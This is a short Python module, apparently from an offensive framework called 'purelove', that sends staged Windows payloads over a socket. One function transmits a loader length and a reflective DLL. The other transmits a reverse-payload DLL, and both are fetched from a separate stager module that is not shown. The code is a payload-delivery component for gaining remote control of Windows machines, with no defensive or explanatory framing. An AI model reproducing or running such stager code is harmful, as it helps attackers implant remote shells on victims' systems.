#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
"""
@DATA:2018-07-22
@Author:mosin
说明:This module file used for sending payloads.
"""

#
# https://github.com/hucmosin/purelove
#
import time
from starger import get_win_refple,get_win_rple

'''
* Here should be introduced into the socket
'''
def send_win_ref_payload(server_sock):
    loader_len,reflective_dll = get_win_refple()
    if loader_len == None and reflective_dll == None:
        return
    server_sock.sendall(loader_len)
    time.sleep(0.5)
    server_sock.sendall(reflective_dll)
    
'''
* Here should be introduced into the socket
'''
def send_win_reverse_payload(server_sock):
    dll_len,dll_data = get_win_rple()
    if dll_len == None and dll_data == None:
        return
    server_sock.send(dll_len)
    time.sleep(0.5)
    server_sock.send(dll_data)
